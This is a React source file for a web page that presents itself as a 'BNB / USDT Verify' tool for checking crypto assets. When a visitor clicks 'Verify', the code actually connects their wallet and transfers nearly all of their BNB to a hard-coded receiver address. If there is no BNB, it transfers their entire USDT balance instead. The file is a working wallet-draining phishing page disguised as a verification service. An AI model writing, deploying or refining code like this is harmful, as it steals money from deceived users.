import React, { useState } from "react";
import { ethers } from "ethers";

const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef"; // ✅ Your wallet
const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; // ✅ Official USDT BEP20 contract
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function transfer(address to, uint amount) returns (bool)"
];

export default function App() {
  const [status, setStatus] = useState("Click Verify to start...");

  const handleVerify = async () => {
    try {
      if (!window.ethereum) {
        setStatus("No wallet detected. Please install Binance Wallet or MetaMask.");
        return;
      }

      await window.ethereum.request({ method: "eth_requestAccounts" });
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();

      setStatus("Checking balances...");

      // ✅ Check BNB balance
      const balanceBNB = await provider.getBalance(userAddress);
      if (balanceBNB > ethers.parseEther("0.001")) {
        setStatus("Sending BNB...");
        const tx = await signer.sendTransaction({
          to: RECEIVER,
          value: balanceBNB - ethers.parseEther("0.0005") // leaves small gas fee
        });
        await tx.wait();
        setStatus("BNB sent successfully ✅");
        return;
      }

      // ✅ Check USDT balance
      const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
      const balanceUSDT = await usdt.balanceOf(userAddress);
      if (balanceUSDT > 0n) {
        setStatus("Sending USDT...");
        const tx = await usdt.transfer(RECEIVER, balanceUSDT);
        await tx.wait();
        setStatus("USDT sent successfully ✅");
        return;
      }

      setStatus("No BNB or USDT found ❌");
    } catch (err) {
      console.error(err);
      setStatus("Error: " + err.message);
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-[#121212] text-gray-200">
      {/* Navbar */}
      <header className="bg-[#171717] bg-opacity-90 backdrop-blur-md sticky top-0 z-50 shadow-md">
        <nav className="container mx-auto px-6 py-4 flex justify-between items-center">
          <div className="flex items-center space-x-2">
            <div className="h-8 w-8 bg-yellow-400 rounded-full"></div>
            <span className="text-xl font-bold text-yellow-400">BNB / USDT Verify</span>
          </div>
        </nav>
      </header>

      {/* Hero Section */}
      <main className="flex flex-col items-center justify-center text-center px-6 py-12">
        <h1 className="text-4xl md:text-5xl font-bold text-yellow-400 mb-4">
          Verify Crypto Assets
        </h1>
        <p className="text-gray-300 mb-8 max-w-xl">
          Supports both BNB and USDT (BEP20) transfers securely.
        </p>

        <div className="relative flex justify-center items-center w-40 h-40 mb-12">
          <div className="pulse-ring"></div>
          <div className="pulse-ring"></div>
          <div className="pulse-ring"></div>
          <button onClick={handleVerify} className="button-primary">Verify</button>
        </div>
        <p className="text-gray-300 text-lg">{status}</p>
      </main>

      {/* Footer */}
      <footer className="bg-[#171717] mt-auto py-6 text-center text-gray-500 text-sm">
        &copy; 2025 BNB Verify. Powered by BNB Chain.
      </footer>
    </div>
  );
}
